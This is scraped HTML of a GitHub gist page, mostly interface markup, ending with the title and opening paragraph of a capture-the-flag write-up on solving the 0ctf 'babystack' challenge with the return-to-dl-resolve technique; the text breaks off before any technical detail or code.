+  <div class="flex-auto min-width-0 width-fit mr-3">
+    <div class="d-flex">
+      <div class="d-none d-md-block">
+        <a class="avatar mr-2 flex-shrink-0" data-hovercard-type="user" data-hovercard-url="/users/ricardo2197/hovercard" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="/ricardo2197"><img class=" avatar-user" src="https://avatars2.githubusercontent.com/u/5010857?s=64&amp;v=4" width="32" height="32" alt="@ricardo2197" /></a>
+      </div>
+      <div class="d-flex flex-column">
+        <h1 class="break-word f3 text-normal mb-md-0 mb-1">
+          <span class="author"><a data-hovercard-type="user" data-hovercard-url="/users/ricardo2197/hovercard" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="/ricardo2197">ricardo2197</a></span><!--
+              --><span class="path-divider">/</span><!--
+              --><strong itemprop="name" class="css-truncate-target mr-1" style="max-width: 410px"><a href="/ricardo2197/8c7f6f5b8950ed6771c1cd3a116f7e62">return to dl-resolve.md</a></strong>
+        </h1>
+        <div class="note m-0">
+          Last active <time-ago datetime="2020-10-09T20:36:52Z" class="no-wrap">Oct 9, 2020</time-ago>
+            &bull;
+            <a class="text-gray" href="/contact/report-content?content_url=https%3A%2F%2Fgist.github.com%2F8c7f6f5b8950ed6771c1cd3a116f7e62&amp;report=ricardo2197+%28user%29">Report abuse</a>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <ul class="d-md-flex d-none pagehead-actions float-none">
+
+
+      <li class="d-lg-block d-none">
+          <div class="thread-subscription-status js-socket-channel js-updatable-content"
+  data-replace-remote-form-target
+  data-channel="eyJjIjoibGlzdC1zdWJzY3JpcHRpb246dXNlcjo1MDEwODU3OjU1MzA5NzM1IiwidCI6MTYwMjUzMzUzMX0=--3546c078c6b18f931ee78554b6ecec0a13e921b76a80948ef5def3b61a10bf04 eyJjIjoidGhyZWFkLXN1YnNjcmlwdGlvbjo4ODgxNDU0Njo1NTMwOTczNSIsInQiOjE2MDI1MzM1MzF9--8763738b5ee5de99f61e461df93eda7113194847919256595faee7786853191c"
+  data-url="/ricardo2197/8c7f6f5b8950ed6771c1cd3a116f7e62/subscription"
+>
+    <!-- '"` --><!-- </textarea></xmp> --></option></form><form data-replace-remote-form="true" class="thread-subscribe-form" action="/ricardo2197/8c7f6f5b8950ed6771c1cd3a116f7e62/subscribe" accept-charset="UTF-8" method="post"><input type="hidden" name="authenticity_token" value="H9MZkkM5p6a4aAT4NMCeWJHHWpmHypOmok8KeiOAdpfjh0yzySFiK6zsVLlzQ+Nb+gbmIoaQObTjKtg4bNtoew==" />      <input type="hidden" name="repository_id" value="5010857">
+      <input type="hidden" name="thread_id" value="88814546">
+      <input type="hidden" name="thread_class" value="Gist">
+      <input type="hidden" name="id" value="subscribe">
+      <button type="submit" class="btn btn-block btn-sm thread-subscribe-button" data-disable-with >
+        <svg class="octicon octicon-bell" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="M8 16a2 2 0 001.985-1.75c.017-.137-.097-.25-.235-.25h-3.5c-.138 0-.252.113-.235.25A2 2 0 008 16z"></path><path fill-rule="evenodd" d="M8 1.5A3.5 3.5 0 004.5 5v2.947c0 .346-.102.683-.294.97l-1.703 2.556a.018.018 0 00-.003.01l.001.006c0 .002.002.004.004.006a.017.017 0 00.006.004l.007.001h10.964l.007-.001a.016.016 0 00.006-.004.016.016 0 00.004-.006l.001-.007a.017.017 0 00-.003-.01l-1.703-2.554a1.75 1.75 0 01-.294-.97V5A3.5 3.5 0 008 1.5zM3 5a5 5 0 0110 0v2.947c0 .05.015.098.042.139l1.703 2.555A1.518 1.518 0 0113.482 13H2.518a1.518 1.518 0 01-1.263-2.36l1.703-2.554A.25.25 0 003 7.947V5z"></path></svg> Subscribe
+      </button>
+</form></div>
+
+      </li>
+
+    <li>
+          <div class="js-toggler-container js-social-container starring-container ">
+    <form class="starred js-social-form" action="/ricardo2197/8c7f6f5b8950ed6771c1cd3a116f7e62/unstar" accept-charset="UTF-8" method="post"><input type="hidden" name="authenticity_token" value="dUymU+bYiIdJ2ODZ7gwBWPxdGVMuvAWUwACBQVQULt0gf+bMqNwBwqjImmyZiTHCXtecvT7H9hb57yZaCCSE2g==" />
+      <input type="hidden" name="context" value="gist"></input>
+      <button type="submit" class="btn btn-sm btn-with-count  js-toggler-target" aria-label="Unstar this gist" title="Unstar ricardo2197/8c7f6f5b8950ed6771c1cd3a116f7e62" data-ga-click="Repository, click unstar button, action:gists/gists#show; text:Unstar">        <svg height="16" class="octicon octicon-star-fill" viewBox="0 0 16 16" version="1.1" width="16" aria-hidden="true"><path fill-rule="evenodd" d="M8 .25a.75.75 0 01.673.418l1.882 3.815 4.21.612a.75.75 0 01.416 1.279l-3.046 2.97.719 4.192a.75.75 0 01-1.088.791L8 12.347l-3.766 1.98a.75.75 0 01-1.088-.79l.72-4.194L.818 6.374a.75.75 0 01.416-1.28l4.21-.611L7.327.668A.75.75 0 018 .25z"></path></svg>
+        Unstar
+</button>        <a class="social-count js-social-count" href="/ricardo2197/8c7f6f5b8950ed6771c1cd3a116f7e62/stargazers"
+           aria-label="21 users starred this repository">
+           21
+        </a>
+</form>
+    <form class="unstarred js-social-form" action="/ricardo2197/8c7f6f5b8950ed6771c1cd3a116f7e62/star" accept-charset="UTF-8" method="post"><input type="hidden" name="authenticity_token" value="Z/erTzPvswRrggs7QQO/SIOm4bgoQxC/tqQyyLIERoXmBxpUjWdAHq+17R3qHTwjxHPhSqwfWSXK9qVfApqlRA==" />
+      <input type="hidden" name="context" value="gist"></input>
+      <button type="submit" class="btn btn-sm btn-with-count  js-toggler-target" aria-label="Unstar this gist" title="Star ricardo2197/8c7f6f5b8950ed6771c1cd3a116f7e62" data-ga-click="Repository, click star button, action:gists/gists#show; text:Star">        <svg height="16" class="octicon octicon-star" viewBox="0 0 16 16" version="1.1" width="16" aria-hidden="true"><path fill-rule="evenodd" d="M8 .25a.75.75 0 01.673.418l1.882 3.815 4.21.612a.75.75 0 01.416 1.279l-3.046 2.97.719 4.192a.75.75 0 01-1.088.791L8 12.347l-3.766 1.98a.75.75 0 01-1.088-.79l.72-4.194L.818 6.374a.75.75 0 01.416-1.28l4.21-.611L7.327.668A.75.75 0 018 .25zm0 2.445L6.615 5.5a.75.75 0 01-.564.41l-3.097.45 2.24 2.184a.75.75 0 01.216.664l-.528 3.084 2.769-1.456a.75.75 0 01.698 0l2.77 1.456-.53-3.084a.75.75 0 01.216-.664l2.24-2.183-3.096-.45a.75.75 0 01-.564-.41L8 2.694v.001z"></path></svg>
+        Star
+</button>        <a class="social-count js-social-count" href="/ricardo2197/8c7f6f5b8950ed6771c1cd3a116f7e62/stargazers"
+           aria-label="21 users starred this repository">
+          21
+        </a>
+</form>  </div>
+
+
+    </li>
+
+      <li>
+          <!-- '"` --><!-- </textarea></xmp> --></option></form><form action="/ricardo2197/8c7f6f5b8950ed6771c1cd3a116f7e62/fork" accept-charset="UTF-8" method="post"><input type="hidden" name="authenticity_token" value="yUqmljDYafWLcsKVhd+HLvtxhxqJNxonivj2i05DM+bK0x7AwKhyLhjpBNalk2mr9dMw5XhGbDlIn6EpfSx5eg==" />
+    <button class="btn btn-sm btn-with-count" type="submit">
+      <svg class="octicon octicon-repo-forked" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M5 3.25a.75.75 0 11-1.5 0 .75.75 0 011.5 0zm0 2.122a2.25 2.25 0 10-1.5 0v.878A2.25 2.25 0 005.75 8.5h1.5v2.128a2.251 2.251 0 101.5 0V8.5h1.5a2.25 2.25 0 002.25-2.25v-.878a2.25 2.25 0 10-1.5 0v.878a.75.75 0 01-.75.75h-4.5A.75.75 0 015 6.25v-.878zm3.75 7.378a.75.75 0 11-1.5 0 .75.75 0 011.5 0zm3-8.75a.75.75 0 100-1.5.75.75 0 000 1.5z"></path></svg>
+      Fork
+    </button>
+      <a class="social-count js-social-count"
+        href="/ricardo2197/8c7f6f5b8950ed6771c1cd3a116f7e62/forks"
+        aria-label="2 users forked this gist">
+        2
+      </a>
+</form>
+      </li>
+  </ul>
+</div>
+
+<div class="d-block d-md-none px-3 px-md-3 px-lg-5 mb-3">
+      <div class="js-toggler-container js-social-container starring-container ">
+    <form class="starred js-social-form" action="/ricardo2197/8c7f6f5b8950ed6771c1cd3a116f7e62/unstar" accept-charset="UTF-8" method="post"><input type="hidden" name="authenticity_token" value="Ykm9l6KsQbA5OTW7vRpNIZl4LKjJdv8aZmomJc2wxKc3ev0I7KjI9dgpTw7Kn327O/KpRtkNDJhfhYE+kYBuoA==" />
+      <input type="hidden" name="context" value="gist"></input>
+      <button type="submit" class="btn btn-sm  btn-block js-toggler-target" aria-label="Unstar this gist" title="Unstar ricardo2197/8c7f6f5b8950ed6771c1cd3a116f7e62" data-ga-click="Repository, click unstar button, action:gists/gists#show; text:Unstar">        <svg height="16" class="octicon octicon-star-fill" viewBox="0 0 16 16" version="1.1" width="16" aria-hidden="true"><path fill-rule="evenodd" d="M8 .25a.75.75 0 01.673.418l1.882 3.815 4.21.612a.75.75 0 01.416 1.279l-3.046 2.97.719 4.192a.75.75 0 01-1.088.791L8 12.347l-3.766 1.98a.75.75 0 01-1.088-.79l.72-4.194L.818 6.374a.75.75 0 01.416-1.28l4.21-.611L7.327.668A.75.75 0 018 .25z"></path></svg>
+        Unstar
+</button></form>
+    <form class="unstarred js-social-form" action="/ricardo2197/8c7f6f5b8950ed6771c1cd3a116f7e62/star" accept-charset="UTF-8" method="post"><input type="hidden" name="authenticity_token" value="Rx6jzlUgzymdrK6ElRBGD7wEISaMjsxNWGBGOxjs6RrG7hLV66g8M1mbSKI+DsVk+9Eh1AjShdckMtGsqHIK2w==" />
+      <input type="hidden" name="context" value="gist"></input>
+      <button type="submit" class="btn btn-sm  btn-block js-toggler-target" aria-label="Unstar this gist" title="Star ricardo2197/8c7f6f5b8950ed6771c1cd3a116f7e62" data-ga-click="Repository, click star button, action:gists/gists#show; text:Star">        <svg height="16" class="octicon octicon-star" viewBox="0 0 16 16" version="1.1" width="16" aria-hidden="true"><path fill-rule="evenodd" d="M8 .25a.75.75 0 01.673.418l1.882 3.815 4.21.612a.75.75 0 01.416 1.279l-3.046 2.97.719 4.192a.75.75 0 01-1.088.791L8 12.347l-3.766 1.98a.75.75 0 01-1.088-.79l.72-4.194L.818 6.374a.75.75 0 01.416-1.28l4.21-.611L7.327.668A.75.75 0 018 .25zm0 2.445L6.615 5.5a.75.75 0 01-.564.41l-3.097.45 2.24 2.184a.75.75 0 01.216.664l-.528 3.084 2.769-1.456a.75.75 0 01.698 0l2.77 1.456-.53-3.084a.75.75 0 01.216-.664l2.24-2.183-3.096-.45a.75.75 0 01-.564-.41L8 2.694v.001z"></path></svg>
+        Star
+</button></form>  </div>
+
+
+</div>
+
+<div class="d-flex flex-md-row flex-column px-0 pr-md-3 px-lg-5">
+  <div class="flex-md-order-1 flex-order-2 flex-auto">
+    <nav class="UnderlineNav box-shadow-none px-3 px-lg-0 "
+     aria-label="Gist"
+     data-pjax="#gist-pjax-container">
+
+  <div class="UnderlineNav-body">
+    <a class="js-selected-navigation-item selected UnderlineNav-item" data-pjax="true" data-hotkey="g c" aria-current="page" data-selected-links="gist_code /ricardo2197/8c7f6f5b8950ed6771c1cd3a116f7e62" href="/ricardo2197/8c7f6f5b8950ed6771c1cd3a116f7e62">
+      <svg class="octicon octicon-code UnderlineNav-octicon" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4.72 3.22a.75.75 0 011.06 1.06L2.06 8l3.72 3.72a.75.75 0 11-1.06 1.06L.47 8.53a.75.75 0 010-1.06l4.25-4.25zm6.56 0a.75.75 0 10-1.06 1.06L13.94 8l-3.72 3.72a.75.75 0 101.06 1.06l4.25-4.25a.75.75 0 000-1.06l-4.25-4.25z"></path></svg>
+      Code
+</a>
+      <a class="js-selected-navigation-item UnderlineNav-item" data-pjax="true" data-hotkey="g r" data-selected-links="gist_revisions /ricardo2197/8c7f6f5b8950ed6771c1cd3a116f7e62/revisions" href="/ricardo2197/8c7f6f5b8950ed6771c1cd3a116f7e62/revisions">
+        <svg class="octicon octicon-git-commit" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M10.5 7.75a2.5 2.5 0 11-5 0 2.5 2.5 0 015 0zm1.43.75a4.002 4.002 0 01-7.86 0H.75a.75.75 0 110-1.5h3.32a4.001 4.001 0 017.86 0h3.32a.75.75 0 110 1.5h-3.32z"></path></svg>
+        Revisions
+        <span title="20" class="Counter ">20</span>
+</a>
+      <a class="js-selected-navigation-item UnderlineNav-item" data-pjax="true" data-hotkey="g s" data-selected-links="gist_stars /ricardo2197/8c7f6f5b8950ed6771c1cd3a116f7e62/stargazers" href="/ricardo2197/8c7f6f5b8950ed6771c1cd3a116f7e62/stargazers">
+        <svg class="octicon octicon-star" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M8 .25a.75.75 0 01.673.418l1.882 3.815 4.21.612a.75.75 0 01.416 1.279l-3.046 2.97.719 4.192a.75.75 0 01-1.088.791L8 12.347l-3.766 1.98a.75.75 0 01-1.088-.79l.72-4.194L.818 6.374a.75.75 0 01.416-1.28l4.21-.611L7.327.668A.75.75 0 018 .25zm0 2.445L6.615 5.5a.75.75 0 01-.564.41l-3.097.45 2.24 2.184a.75.75 0 01.216.664l-.528 3.084 2.769-1.456a.75.75 0 01.698 0l2.77 1.456-.53-3.084a.75.75 0 01.216-.664l2.24-2.183-3.096-.45a.75.75 0 01-.564-.41L8 2.694v.001z"></path></svg>
+        Stars
+        <span title="21" class="Counter ">21</span>
+</a>
+      <a class="js-selected-navigation-item UnderlineNav-item" data-pjax="true" data-hotkey="g f" data-selected-links="gist_forks /ricardo2197/8c7f6f5b8950ed6771c1cd3a116f7e62/forks" href="/ricardo2197/8c7f6f5b8950ed6771c1cd3a116f7e62/forks">
+        <svg class="octicon octicon-git-branch" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M11.75 2.5a.75.75 0 100 1.5.75.75 0 000-1.5zm-2.25.75a2.25 2.25 0 113 2.122V6A2.5 2.5 0 0110 8.5H6a1 1 0 00-1 1v1.128a2.251 2.251 0 11-1.5 0V5.372a2.25 2.25 0 111.5 0v1.836A2.492 2.492 0 016 7h4a1 1 0 001-1v-.628A2.25 2.25 0 019.5 3.25zM4.25 12a.75.75 0 100 1.5.75.75 0 000-1.5zM3.5 3.25a.75.75 0 111.5 0 .75.75 0 01-1.5 0z"></path></svg>
+        Forks
+        <span title="2" class="Counter ">2</span>
+</a>  </div>
+</nav>
+
+  </div>
+
+  <div class="d-md-flex d-none flex-items-center flex-md-order-2 flex-order-1 file-navigation-options" data-multiple>
+
+    <div class="d-lg-table d-none">
+      <div class="file-navigation-option v-align-middle">
+
+  <div class="d-md-flex d-none">
+    <div class="input-group">
+      <div class="input-group-button">
+        <details class="details-reset details-overlay select-menu">
+          <summary class="btn btn-sm select-menu-button" data-ga-click="Repository, clone Embed, location:repo overview">
+            <span data-menu-button>Embed</span>
+          </summary>
+          <details-menu
+            class="select-menu-modal position-absolute"
+            data-menu-input="gist-share-url"
+            style="z-index: 99;" aria-label="Clone options">
+            <div class="select-menu-header">
+              <span class="select-menu-title">What would you like to do?</span>
+            </div>
+            <div class="select-menu-list">
+                <button name="button" type="button" class="select-menu-item width-full" aria-checked="true" role="menuitemradio" value="&lt;script src=&quot;https://gist.github.com/ricardo2197/8c7f6f5b8950ed6771c1cd3a116f7e62.js&quot;&gt;&lt;/script&gt;" data-hydro-click="{&quot;event_type&quot;:&quot;clone_or_download.click&quot;,&quot;payload&quot;:{&quot;feature_clicked&quot;:&quot;EMBED&quot;,&quot;git_repository_type&quot;:&quot;GIST&quot;,&quot;gist_id&quot;:88814546,&quot;originating_url&quot;:&quot;https://gist.github.com/ricardo2197/8c7f6f5b8950ed6771c1cd3a116f7e62&quot;,&quot;user_id&quot;:55309735}}" data-hydro-click-hmac="bf8338d8025af54792547775d5e6520a0770848b8c0bb4fffb1678c3a5e8259b">
+                  <svg class="octicon octicon-check select-menu-item-icon" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M13.78 4.22a.75.75 0 010 1.06l-7.25 7.25a.75.75 0 01-1.06 0L2.22 9.28a.75.75 0 011.06-1.06L6 10.94l6.72-6.72a.75.75 0 011.06 0z"></path></svg>
+                  <div class="select-menu-item-text">
+                    <span class="select-menu-item-heading" data-menu-button-text>
+                      
+                      Embed
+                    </span>
+                      <span class="description">
+                        Embed this gist in your website.
+                      </span>
+                  </div>
+</button>                <button name="button" type="button" class="select-menu-item width-full" aria-checked="false" role="menuitemradio" value="https://gist.github.com/ricardo2197/8c7f6f5b8950ed6771c1cd3a116f7e62" data-hydro-click="{&quot;event_type&quot;:&quot;clone_or_download.click&quot;,&quot;payload&quot;:{&quot;feature_clicked&quot;:&quot;SHARE&quot;,&quot;git_repository_type&quot;:&quot;GIST&quot;,&quot;gist_id&quot;:88814546,&quot;originating_url&quot;:&quot;https://gist.github.com/ricardo2197/8c7f6f5b8950ed6771c1cd3a116f7e62&quot;,&quot;user_id&quot;:55309735}}" data-hydro-click-hmac="05cf9b9aa7dfd7bd253de301bcdd4d5b7bd20dc6b08afd347bf5eea18632134a">
+                  <svg class="octicon octicon-check select-menu-item-icon" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M13.78 4.22a.75.75 0 010 1.06l-7.25 7.25a.75.75 0 01-1.06 0L2.22 9.28a.75.75 0 011.06-1.06L6 10.94l6.72-6.72a.75.75 0 011.06 0z"></path></svg>
+                  <div class="select-menu-item-text">
+                    <span class="select-menu-item-heading" data-menu-button-text>
+                      
+                      Share
+                    </span>
+                      <span class="description">
+                        Copy sharable link for this gist.
+                      </span>
+                  </div>
+</button>                <button name="button" type="button" class="select-menu-item width-full" aria-checked="false" role="menuitemradio" value="https://gist.github.com/8c7f6f5b8950ed6771c1cd3a116f7e62.git" data-hydro-click="{&quot;event_type&quot;:&quot;clone_or_download.click&quot;,&quot;payload&quot;:{&quot;feature_clicked&quot;:&quot;USE_HTTPS&quot;,&quot;git_repository_type&quot;:&quot;GIST&quot;,&quot;gist_id&quot;:88814546,&quot;originating_url&quot;:&quot;https://gist.github.com/ricardo2197/8c7f6f5b8950ed6771c1cd3a116f7e62&quot;,&quot;user_id&quot;:55309735}}" data-hydro-click-hmac="33ce2776ee8cfb7f7128a0464f796bfa4507129baae6b4c796f7ead3e065627e">
+                  <svg class="octicon octicon-check select-menu-item-icon" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M13.78 4.22a.75.75 0 010 1.06l-7.25 7.25a.75.75 0 01-1.06 0L2.22 9.28a.75.75 0 011.06-1.06L6 10.94l6.72-6.72a.75.75 0 011.06 0z"></path></svg>
+                  <div class="select-menu-item-text">
+                    <span class="select-menu-item-heading" data-menu-button-text>
+                      Clone via
+                      HTTPS
+                    </span>
+                      <span class="description">
+                        Clone with Git or checkout with SVN using the repository’s web address.
+                      </span>
+                  </div>
+</button>                <button name="button" type="button" class="select-menu-item width-full" aria-checked="false" role="menuitemradio" value="git@gist.github.com:8c7f6f5b8950ed6771c1cd3a116f7e62.git" data-hydro-click="{&quot;event_type&quot;:&quot;clone_or_download.click&quot;,&quot;payload&quot;:{&quot;feature_clicked&quot;:&quot;USE_SSH&quot;,&quot;git_repository_type&quot;:&quot;GIST&quot;,&quot;gist_id&quot;:88814546,&quot;originating_url&quot;:&quot;https://gist.github.com/ricardo2197/8c7f6f5b8950ed6771c1cd3a116f7e62&quot;,&quot;user_id&quot;:55309735}}" data-hydro-click-hmac="eb6fc762ca4775a594bda1b89ddcf5d8fc378d740733fcc5d22472139eae0ed3">
+                  <svg class="octicon octicon-check select-menu-item-icon" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M13.78 4.22a.75.75 0 010 1.06l-7.25 7.25a.75.75 0 01-1.06 0L2.22 9.28a.75.75 0 011.06-1.06L6 10.94l6.72-6.72a.75.75 0 011.06 0z"></path></svg>
+                  <div class="select-menu-item-text">
+                    <span class="select-menu-item-heading" data-menu-button-text>
+                      Clone via
+                      SSH
+                    </span>
+                      <span class="description">
+                        Clone with an SSH key and passphrase from your GitHub settings.
+                      </span>
+                  </div>
+</button>            </div>
+            <div class="select-menu-list">
+              <a role="link" class="select-menu-item select-menu-action" href="https://docs.github.com/articles/which-remote-url-should-i-use" target="_blank">
+                <svg class="octicon octicon-question select-menu-item-icon" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M8 1.5a6.5 6.5 0 100 13 6.5 6.5 0 000-13zM0 8a8 8 0 1116 0A8 8 0 010 8zm9 3a1 1 0 11-2 0 1 1 0 012 0zM6.92 6.085c.081-.16.19-.299.34-.398.145-.097.371-.187.74-.187.28 0 .553.087.738.225A.613.613 0 019 6.25c0 .177-.04.264-.077.318a.956.956 0 01-.277.245c-.076.051-.158.1-.258.161l-.007.004a7.728 7.728 0 00-.313.195 2.416 2.416 0 00-.692.661.75.75 0 001.248.832.956.956 0 01.276-.245 6.3 6.3 0 01.26-.16l.006-.004c.093-.057.204-.123.313-.195.222-.149.487-.355.692-.662.214-.32.329-.702.329-1.15 0-.76-.36-1.348-.863-1.725A2.76 2.76 0 008 4c-.631 0-1.155.16-1.572.438-.413.276-.68.638-.849.977a.75.75 0 101.342.67z"></path></svg>
+                <div class="select-menu-item-text">
+                  Learn more about clone URLs
+                </div>
+              </a>
+            </div>
+          </details-menu>
+        </details>
+      </div>
+
+      <input
+        id="gist-share-url"
+        type="text"
+        data-autoselect
+        class="form-control input-monospace input-sm"
+        value="&lt;script src=&quot;https://gist.github.com/ricardo2197/8c7f6f5b8950ed6771c1cd3a116f7e62.js&quot;&gt;&lt;/script&gt;"
+        aria-label="Clone this repository at &lt;script src=&quot;https://gist.github.com/ricardo2197/8c7f6f5b8950ed6771c1cd3a116f7e62.js&quot;&gt;&lt;/script&gt;"
+        readonly>
+
+      <div class="input-group-button">
+        <clipboard-copy for="gist-share-url" aria-label="Copy to clipboard" class="btn btn-sm zeroclipboard-button" data-hydro-click="{&quot;event_type&quot;:&quot;clone_or_download.click&quot;,&quot;payload&quot;:{&quot;feature_clicked&quot;:&quot;COPY_URL&quot;,&quot;git_repository_type&quot;:&quot;GIST&quot;,&quot;gist_id&quot;:88814546,&quot;originating_url&quot;:&quot;https://gist.github.com/ricardo2197/8c7f6f5b8950ed6771c1cd3a116f7e62&quot;,&quot;user_id&quot;:55309735}}" data-hydro-click-hmac="77a406c0f2805bb2b70e3aaa6d8fdb92d34782c08cd96d6ee2527acd3fc334fd"><svg class="octicon octicon-clippy" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M5.75 1a.75.75 0 00-.75.75v3c0 .414.336.75.75.75h4.5a.75.75 0 00.75-.75v-3a.75.75 0 00-.75-.75h-4.5zm.75 3V2.5h3V4h-3zm-2.874-.467a.75.75 0 00-.752-1.298A1.75 1.75 0 002 3.75v9.5c0 .966.784 1.75 1.75 1.75h8.5A1.75 1.75 0 0014 13.25v-9.5a1.75 1.75 0 00-.874-1.515.75.75 0 10-.752 1.298.25.25 0 01.126.217v9.5a.25.25 0 01-.25.25h-8.5a.25.25 0 01-.25-.25v-9.5a.25.25 0 01.126-.217z"></path></svg></clipboard-copy>
+      </div>
+    </div>
+  </div>
+</div>
+
+    </div>
+
+    <div class="ml-2 file-navigation-option">
+    <a class="btn btn-sm tooltipped tooltipped-s tooltipped-multiline js-remove-unless-platform" data-platforms="windows,mac" aria-label="Save ricardo2197/8c7f6f5b8950ed6771c1cd3a116f7e62 to your computer and use it in GitHub Desktop." data-hydro-click="{&quot;event_type&quot;:&quot;clone_or_download.click&quot;,&quot;payload&quot;:{&quot;feature_clicked&quot;:&quot;OPEN_IN_DESKTOP&quot;,&quot;git_repository_type&quot;:&quot;GIST&quot;,&quot;gist_id&quot;:88814546,&quot;originating_url&quot;:&quot;https://gist.github.com/ricardo2197/8c7f6f5b8950ed6771c1cd3a116f7e62&quot;,&quot;user_id&quot;:55309735}}" data-hydro-click-hmac="36d4742c1cf50ed24135d1eef7ddee89d332f62d71c64e6178ba45d2fd5b4649" href="https://desktop.github.com"><svg class="octicon octicon-desktop-download" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M8.75 5V.75a.75.75 0 00-1.5 0V5H5.104a.25.25 0 00-.177.427l2.896 2.896a.25.25 0 00.354 0l2.896-2.896A.25.25 0 0010.896 5H8.75zM1.5 2.75a.25.25 0 01.25-.25h3a.75.75 0 000-1.5h-3A1.75 1.75 0 000 2.75v7.5C0 11.216.784 12 1.75 12h3.727c-.1 1.041-.52 1.872-1.292 2.757A.75.75 0 004.75 16h6.5a.75.75 0 00.565-1.243c-.772-.885-1.193-1.716-1.292-2.757h3.727A1.75 1.75 0 0016 10.25v-7.5A1.75 1.75 0 0014.25 1h-3a.75.75 0 000 1.5h3a.25.25 0 01.25.25v7.5a.25.25 0 01-.25.25H1.75a.25.25 0 01-.25-.25v-7.5zM9.018 12H6.982a5.72 5.72 0 01-.765 2.5h3.566a5.72 5.72 0 01-.765-2.5z"></path></svg></a>
+</div>
+
+
+    <div class="ml-2">
+      <a class="btn btn-sm" rel="nofollow" data-hydro-click="{&quot;event_type&quot;:&quot;clone_or_download.click&quot;,&quot;payload&quot;:{&quot;feature_clicked&quot;:&quot;DOWNLOAD_ZIP&quot;,&quot;git_repository_type&quot;:&quot;GIST&quot;,&quot;gist_id&quot;:88814546,&quot;originating_url&quot;:&quot;https://gist.github.com/ricardo2197/8c7f6f5b8950ed6771c1cd3a116f7e62&quot;,&quot;user_id&quot;:55309735}}" data-hydro-click-hmac="dd1177d19a0dda13b168d5bac028a6bc066fb7573cb58fe91e4248e7c929e380" data-ga-click="Gist, download zip, location:gist overview" href="/ricardo2197/8c7f6f5b8950ed6771c1cd3a116f7e62/archive/6798694ef6a19c265911567fa334f48fe50f206d.zip">Download ZIP</a>
+    </div>
+  </div>
+</div>
+
+
+  </div>
+</div>
+
+<div class="container-lg px-3 new-discussion-timeline">
+  <div class="repository-content gist-content" >
+    
+  <div>
+      <div itemprop="about">
+    Return-to dl-resolve
+  </div>
+
+
+        <div class="js-gist-file-update-container js-task-list-container file-box">
+  <div id="file-return-to-dl-resolve-md" class="file my-2">
+      <div class="file-header d-flex flex-md-items-center flex-items-start">
+        <div class="file-actions flex-order-2 pt-0">
+
+          <a href="/ricardo2197/8c7f6f5b8950ed6771c1cd3a116f7e62/raw/6798694ef6a19c265911567fa334f48fe50f206d/return%2520to%2520dl-resolve.md" role="button" class="btn btn-sm ">Raw</a>
+        </div>
+        <div class="file-info pr-4 d-flex flex-md-items-center flex-items-start flex-order-1 flex-auto">
+          <span class="icon mr-1">
+            <svg class="octicon octicon-code-square" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M1.75 1.5a.25.25 0 00-.25.25v12.5c0 .138.112.25.25.25h12.5a.25.25 0 00.25-.25V1.75a.25.25 0 00-.25-.25H1.75zM0 1.75C0 .784.784 0 1.75 0h12.5C15.216 0 16 .784 16 1.75v12.5A1.75 1.75 0 0114.25 16H1.75A1.75 1.75 0 010 14.25V1.75zm9.22 3.72a.75.75 0 000 1.06L10.69 8 9.22 9.47a.75.75 0 101.06 1.06l2-2a.75.75 0 000-1.06l-2-2a.75.75 0 00-1.06 0zM6.78 6.53a.75.75 0 00-1.06-1.06l-2 2a.75.75 0 000 1.06l2 2a.75.75 0 101.06-1.06L5.31 8l1.47-1.47z"></path></svg>
+          </span>
+          <a class="wb-break-all" href="#file-return-to-dl-resolve-md">
+            <strong class="user-select-contain gist-blob-name css-truncate-target">
+              return to dl-resolve.md
+            </strong>
+          </a>
+        </div>
+      </div>
+    
+  <div id="file-return-to-dl-resolve-md-readme" class="Box-body readme blob js-code-block-container p-5 p-xl-6 gist-border-0">
+    <article class="markdown-body entry-content container-lg" itemprop="text"><h1><a id="user-content-0ctf-babystack-with-return-to-dl-resolve" class="anchor" aria-hidden="true" href="#0ctf-babystack-with-return-to-dl-resolve"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg></a>0ctf babystack with return-to dl-resolve</h1>
+<p>In this write-up I will discuss how I managed to solve the challenge "babystack" from 0ctf with a technique called return to dl-resolve. I did not know this kind of return-to attack before the contest. In the following sections a detailed explanation of the entire exploit will be presented.</p>
